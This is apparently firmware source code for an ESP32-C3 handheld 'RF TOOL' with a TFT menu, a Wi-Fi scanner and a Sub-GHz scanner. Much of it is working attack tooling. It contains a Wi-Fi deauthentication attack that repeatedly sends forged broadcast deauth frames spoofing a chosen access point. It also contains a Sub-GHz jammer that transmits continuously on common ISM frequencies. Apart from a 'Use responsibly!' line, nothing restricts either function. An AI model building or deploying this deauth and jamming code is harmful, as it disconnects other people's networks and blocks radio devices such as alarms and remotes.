/*
 * RF TOOL v4.2 - Bruce Style UI for ESP32-C3 Supermini
 * Повний код з усіма оголошеннями
 * 
 * Pinout:
 * TFT:   CS=5, DC=6, RST=7, SCK=8, MOSI=10, LED=3.3V
 * CC1101: CS=4, SCK=8, MOSI=10, MISO=21
 * Buttons: UP=1, DOWN=20, SEL=3, BACK=0
 */

#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <RadioLib.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ====================== Піни ======================
#define TFT_CS      5
#define TFT_DC      6
#define TFT_RST     7
#define TFT_MOSI    10
#define TFT_SCLK    8

#define CC1101_CS   4
#define CC1101_MISO 21

#define BTN_UP      1
#define BTN_DOWN    20
#define BTN_SEL     3
#define BTN_BACK    0

// ====================== Кольори ======================
#define BG_COLOR        ST77XX_BLACK
#define HEADER_COLOR    ST77XX_CYAN
#define SELECTED_COLOR  ST77XX_YELLOW
#define TEXT_COLOR      ST77XX_WHITE
#define ALERT_COLOR     ST77XX_RED
#define SUCCESS_COLOR   ST77XX_GREEN
#define LINE_COLOR      ST77XX_BLUE

// ====================== Об'єкти ======================
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
CC1101 cc1101 = new Module(CC1101_CS, RADIOLIB_NC, RADIOLIB_NC);

// ====================== Стани меню ======================
enum AppState {
  MAIN_MENU,
  WIFI_MENU,
  WIFI_SCAN,
  WIFI_DEAUTH,
  SUBGHZ_SCAN,
  SUBGHZ_JAM,
  SETTINGS
};

AppState currentState = MAIN_MENU;

// Головне меню
const char* mainMenuItems[] = {"Wi-Fi", "Sub-GHz Scan", "Sub-GHz Jam", "Settings"};
const uint8_t mainMenuSize = 4;
int8_t mainMenuIndex = 0;

// Wi-Fi меню
const char* wifiMenuItems[] = {"Scan APs", "Deauth", "Back"};
const uint8_t wifiMenuSize = 3;
int8_t wifiMenuIndex = 0;

// Налаштування частот
const char* freqNames[] = {"315.0 MHz", "433.92 MHz", "868.0 MHz", "915.0 MHz"};
float freqs[] = {315.0, 433.92, 868.0, 915.0};
uint8_t freqIndex = 1;
const uint8_t freqCount = 4;

// Wi-Fi дані
int apCount = 0;
String apList[20];
uint8_t apBSSID[20][6];
int apChannel[20];
int selectedAP = 0;
bool deauthActive = false;

// Sub-GHz
bool scanActive = false;
bool jamActive = false;
float lastRSSI = 0;

// ====================== Прототипи функцій ======================
void drawHeader(const char* title);
void drawMainMenu();
void drawWiFiMenu();
void drawWiFiScanList();
void drawWiFiDeauthScreen();
void drawSubGHzScanScreen();
void drawSubGHzJamScreen();
void drawSettingsScreen();
void drawButtonHints(const char* hints);
void handleNavigation();
void startWiFiScan();
void startDeauth();
void stopDeauth();
void toggleSubGHzScan();
void toggleSubGHzJam();

// ====================== Setup ======================
void setup() {
  Serial.begin(115200);
  delay(500);

  // Кнопки
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  // Ініціалізація SPI без MISO для дисплея
  SPI.begin(TFT_SCLK, -1, TFT_MOSI);
  
  // CS CC1101 в HIGH щоб не заважав дисплею
  pinMode(CC1101_CS, OUTPUT);
  digitalWrite(CC1101_CS, HIGH);

  // Дисплей
  tft.initR(INITR_MINI160x80);
  tft.setRotation(1);
  tft.fillScreen(BG_COLOR);
  tft.setTextWrap(false);

  // Повідомлення про статус
  tft.setTextColor(SUCCESS_COLOR);
  tft.setCursor(10, 30);
  tft.print("TFT OK!");

  // Перезапуск SPI з MISO для CC1101
  SPI.end();
  delay(10);
  SPI.begin(TFT_SCLK, CC1101_MISO, TFT_MOSI);
  digitalWrite(CC1101_CS, HIGH);

 // CC1101
  int state = cc1101.begin(freqs[freqIndex]);
  if (state == RADIOLIB_ERR_NONE) {
    cc1101.setOutputPower(12);
    Serial.println("CC1101 OK");
    tft.setCursor(10, 50);
    tft.print("CC1101 OK!");
  } else {
    Serial.printf("CC1101 fail: %d\n", state);
    tft.setTextColor(ALERT_COLOR);
    tft.setCursor(10, 50);
    tft.print("CC1101 FAIL");
  }
  cc1101.standby();

  // Wi-Fi
  WiFi.mode(WIFI_STA);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  esp_wifi_set_ps(WIFI_PS_NONE);

  delay(10);
  drawMainMenu();
}

// ====================== Головний цикл ======================
void loop() {
  handleNavigation();

  // Оновлення RSSI у режимі сканування
  if (currentState == SUBGHZ_SCAN && scanActive) {
    static unsigned long lastUpdate = 0;
    if (millis() - lastUpdate >= 200) {
      lastUpdate = millis();
      lastRSSI = cc1101.getRSSI();
      tft.fillRect(10, 60, 140, 20, BG_COLOR);
      tft.setCursor(10, 60);
      tft.setTextColor(TEXT_COLOR);
      tft.print("RSSI: ");
      tft.print(lastRSSI, 0);
      tft.print(" dBm");
    }
  }

  // Jammer
  if (currentState == SUBGHZ_JAM && jamActive) {
    cc1101.transmitDirect();
  }

  // Deauth
  if (currentState == WIFI_DEAUTH && deauthActive) {
    static unsigned long lastDeauth = 0;
    if (millis() - lastDeauth >= 100) {
      lastDeauth = millis();
      uint8_t packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        apBSSID[selectedAP][0], apBSSID[selectedAP][1], apBSSID[selectedAP][2],
        apBSSID[selectedAP][3], apBSSID[selectedAP][4], apBSSID[selectedAP][5],
        apBSSID[selectedAP][0], apBSSID[selectedAP][1], apBSSID[selectedAP][2],
        apBSSID[selectedAP][3], apBSSID[selectedAP][4], apBSSID[selectedAP][5],
        0x00, 0x00, 0x01, 0x00
      };
      esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    }
  }

  delay(20);
}

// ====================== Функції малювання ======================
void drawHeader(const char* title) {
  tft.fillRect(0, 0, 160, 20, HEADER_COLOR);
  tft.setTextColor(BG_COLOR);
  tft.setTextSize(1);
  tft.setCursor(5, 6);
  tft.print(title);
  tft.drawFastHLine(0, 20, 160, LINE_COLOR);
}

void drawButtonHints(const char* hints) {
  tft.fillRect(0, 140, 160, 20, BG_COLOR);
  tft.setTextColor(ST77XX_CYAN);
  tft.setTextSize(1);
  tft.setCursor(2, 145);
  tft.print(hints);
}

void drawMainMenu() {
  tft.fillScreen(BG_COLOR);
  drawHeader("RF TOOL v4.2");
  
  const char* icons[] = {"[W]", "[S]", "[J]", "[#]"};
  
  for (int i = 0; i < mainMenuSize; i++) {
    int y = 35 + i * 25;
    if (i == mainMenuIndex) {
      tft.fillRoundRect(5, y-2, 150, 20, 4, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(15, y);
    tft.print(icons[i]);
    tft.setCursor(35, y);
    tft.print(mainMenuItems[i]);
  }
  
  drawButtonHints("UP/DN:nav  SEL:enter");
}

void drawWiFiMenu() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Wi-Fi Tools");
  
  for (int i = 0; i < wifiMenuSize; i++) {
    int y = 35 + i * 25;
    if (i == wifiMenuIndex) {
      tft.fillRoundRect(5, y-2, 150, 20, 4, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(15, y);
    tft.print("> ");
    tft.print(wifiMenuItems[i]);
  }
  drawButtonHints("UP/DN:nav  SEL:select  BACK:back");
}

void startWiFiScan() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Wi-Fi Scanner");
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 35);
  tft.print("Scanning...");
  
  apCount = WiFi.scanNetworks();
  if (apCount > 20) apCount = 20;
  
  for (int i = 0; i < apCount; i++) {
    apList[i] = WiFi.SSID(i);
    apChannel[i] = WiFi.channel(i);
    memcpy(apBSSID[i], WiFi.BSSID(i), 6);
  }
  WiFi.scanDelete();
  
  drawWiFiScanList();
}

void drawWiFiScanList() {
  tft.fillScreen(BG_COLOR);
  drawHeader("AP List");
  
  if (apCount == 0) {
    tft.setTextColor(ALERT_COLOR);
    tft.setCursor(10, 40);
    tft.print("No networks found");
    drawButtonHints("BACK:return");
    return;
  }
  
  for (int i = 0; i < apCount; i++) {
    int y = 30 + i * 15;
    if (y > 130) break;
    
    if (i == selectedAP) {
      tft.fillRect(5, y-2, 150, 13, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(10, y);
    String ssid = apList[i];
    if (ssid.length() > 14) ssid = ssid.substring(0, 12) + "..";
    tft.print(ssid);
    tft.print(" ch:");
    tft.print(apChannel[i]);
  }
  
  drawButtonHints("UP/DN:select  SEL:deauth  BACK:back");
}

void drawWiFiDeauthScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Deauth Attack");
  
  tft.setTextColor(ALERT_COLOR);
  tft.setCursor(10, 40);
  tft.print("Target:");
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 55);
  tft.print(apList[selectedAP]);
  
  tft.setTextColor(deauthActive ? SUCCESS_COLOR : TEXT_COLOR);
  tft.setCursor(10, 80);
  tft.print(deauthActive ? "ATTACK RUNNING" : "Press SEL to start");
  
  drawButtonHints("SEL:start/stop  BACK:back");
}

void startDeauth() {
  deauthActive = true;
  esp_wifi_set_channel(apChannel[selectedAP], WIFI_SECOND_CHAN_NONE);
  drawWiFiDeauthScreen();
}

void stopDeauth() {
  deauthActive = false;
  drawWiFiDeauthScreen();
}

void drawSubGHzScanScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Sub-GHz Scanner");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 35);
  tft.print("Freq: ");
  tft.print(freqs[freqIndex], 2);
  tft.print(" MHz");
  
  tft.setCursor(10, 50);
  tft.print("Status: ");
  if (scanActive) {
    tft.setTextColor(SUCCESS_COLOR);
    tft.print("SCANNING");
  } else {
    tft.setTextColor(TEXT_COLOR);
    tft.print("Idle");
  }
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 65);
  tft.print("RSSI: ");
  tft.print(lastRSSI, 0);
  tft.print(" dBm");
  
  drawButtonHints("SEL:start/stop  L/R:freq  BACK:back");
}

void toggleSubGHzScan() {
  scanActive = !scanActive;
  if (scanActive) {
    cc1101.setFrequency(freqs[freqIndex]);
    cc1101.receiveDirect();
  } else {
    cc1101.standby();
  }
  drawSubGHzScanScreen();
}

void drawSubGHzJamScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Sub-GHz Jammer");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 35);
  tft.print("Freq: ");
  tft.print(freqs[freqIndex], 2);
  tft.print(" MHz");
  
  tft.setCursor(10, 55);
  tft.print("Status: ");
  if (jamActive) {
    tft.setTextColor(ALERT_COLOR);
    tft.print("JAMMING!");
  } else {
    tft.setTextColor(TEXT_COLOR);
    tft.print("Idle");
  }
  
  tft.setTextColor(ALERT_COLOR);
  tft.setCursor(10, 90);
  tft.print("Use responsibly!");
  
  drawButtonHints("SEL:start/stop  L/R:freq  BACK:back");
}

void toggleSubGHzJam() {
  jamActive = !jamActive;
  if (jamActive) {
    cc1101.setFrequency(freqs[freqIndex]);
    cc1101.transmitDirect();
  } else {
    cc1101.standby();
  }
  drawSubGHzJamScreen();
}

void drawSettingsScreen() {
  tft.fillScreen(BG_COLOR);
  drawHeader("Settings");
  
  tft.setTextColor(TEXT_COLOR);
  tft.setCursor(10, 35);
  tft.print("CC1101 Frequency:");
  
  for (int i = 0; i < freqCount; i++) {
    int y = 55 + i * 18;
    if (i == freqIndex) {
      tft.fillRoundRect(10, y-2, 140, 16, 4, SELECTED_COLOR);
      tft.setTextColor(BG_COLOR);
    } else {
      tft.setTextColor(TEXT_COLOR);
    }
    tft.setCursor(20, y);
    tft.print(freqNames[i]);
  }
  
  drawButtonHints("UP/DN:change  SEL:apply  BACK:back");
}

// ====================== Навігація ======================
void handleNavigation() {
  static unsigned long lastPress = 0;
  if (millis() - lastPress < 180) return;
  
  bool up   = digitalRead(BTN_UP) == LOW;
  bool down = digitalRead(BTN_DOWN) == LOW;
  bool sel  = digitalRead(BTN_SEL) == LOW;
  bool back = digitalRead(BTN_BACK) == LOW;
  
  if (!up && !down && !sel && !back) return;
  lastPress = millis();
  
  // BACK
  if (back) {
    if (currentState == MAIN_MENU) return;
    
    if (deauthActive) stopDeauth();
    if (scanActive) { scanActive = false; cc1101.standby(); }
    if (jamActive)  { jamActive = false; cc1101.standby(); }
    
    if (currentState == WIFI_MENU || currentState == SETTINGS) {
      currentState = MAIN_MENU;
      drawMainMenu();
    } else if (currentState == WIFI_SCAN || currentState == WIFI_DEAUTH) {
      currentState = WIFI_MENU;
      wifiMenuIndex = (currentState == WIFI_DEAUTH) ? 1 : 0;
      drawWiFiMenu();
    } else if (currentState == SUBGHZ_SCAN || currentState == SUBGHZ_JAM) {
      currentState = MAIN_MENU;
      drawMainMenu();
    }
    return;
  }
  
  // Обробка станів
  switch (currentState) {
    case MAIN_MENU:
      if (up)   mainMenuIndex = (mainMenuIndex - 1 + mainMenuSize) % mainMenuSize;
      if (down) mainMenuIndex = (mainMenuIndex + 1) % mainMenuSize;
      if (up || down) drawMainMenu();
      
      if (sel) {
        switch (mainMenuIndex) {
          case 0: currentState = WIFI_MENU; drawWiFiMenu(); break;
          case 1: currentState = SUBGHZ_SCAN; drawSubGHzScanScreen(); break;
          case 2: currentState = SUBGHZ_JAM; drawSubGHzJamScreen(); break;
          case 3: currentState = SETTINGS; drawSettingsScreen(); break;
        }
      }
      break;
      
    case WIFI_MENU:
      if (up)   wifiMenuIndex = (wifiMenuIndex - 1 + wifiMenuSize) % wifiMenuSize;
      if (down) wifiMenuIndex = (wifiMenuIndex + 1) % wifiMenuSize;
      if (up || down) drawWiFiMenu();
      
      if (sel) {
        if (wifiMenuIndex == 0) {
          startWiFiScan();
          currentState = WIFI_SCAN;
        } else if (wifiMenuIndex == 1) {
          if (apCount == 0) startWiFiScan();
          currentState = WIFI_DEAUTH;
          drawWiFiDeauthScreen();
        } else if (wifiMenuIndex == 2) {
          currentState = MAIN_MENU;
          drawMainMenu();
        }
      }
      break;
      
    case WIFI_SCAN:
      if (apCount == 0) break;
      if (up)   selectedAP = (selectedAP - 1 + apCount) % apCount;
      if (down) selectedAP = (selectedAP + 1) % apCount;
      if (up || down) drawWiFiScanList();
      
      if (sel) {
        currentState = WIFI_DEAUTH;
        drawWiFiDeauthScreen();
      }
      break;
      
    case WIFI_DEAUTH:
      if (sel) {
        if (deauthActive) stopDeauth();
        else startDeauth();
      }
      break;
      
    case SUBGHZ_SCAN:
      if (up)   { freqIndex = (freqIndex - 1 + freqCount) % freqCount; cc1101.setFrequency(freqs[freqIndex]); drawSubGHzScanScreen(); }
      if (down) { freqIndex = (freqIndex + 1) % freqCount; cc1101.setFrequency(freqs[freqIndex]); drawSubGHzScanScreen(); }
      if (sel)  toggleSubGHzScan();
      break;
      
    case SUBGHZ_JAM:
      if (up)   { freqIndex = (freqIndex - 1 + freqCount) % freqCount; cc1101.setFrequency(freqs[freqIndex]); drawSubGHzJamScreen(); }
      if (down) { freqIndex = (freqIndex + 1) % freqCount; cc1101.setFrequency(freqs[freqIndex]); drawSubGHzJamScreen(); }
      if (sel)  toggleSubGHzJam();
      break;
      
    case SETTINGS:
      if (up)   freqIndex = (freqIndex - 1 + freqCount) % freqCount;
      if (down) freqIndex = (freqIndex + 1) % freqCount;
      if (up || down) drawSettingsScreen();
      
      if (sel) {
        cc1101.setFrequency(freqs[freqIndex]);
        tft.fillRect(10, 120, 140, 15, BG_COLOR);
        tft.setTextColor(SUCCESS_COLOR);
        tft.setCursor(15, 122);
        tft.print("Frequency set!");
        delay(800);
        drawSettingsScreen();
      }
      break;
  }
}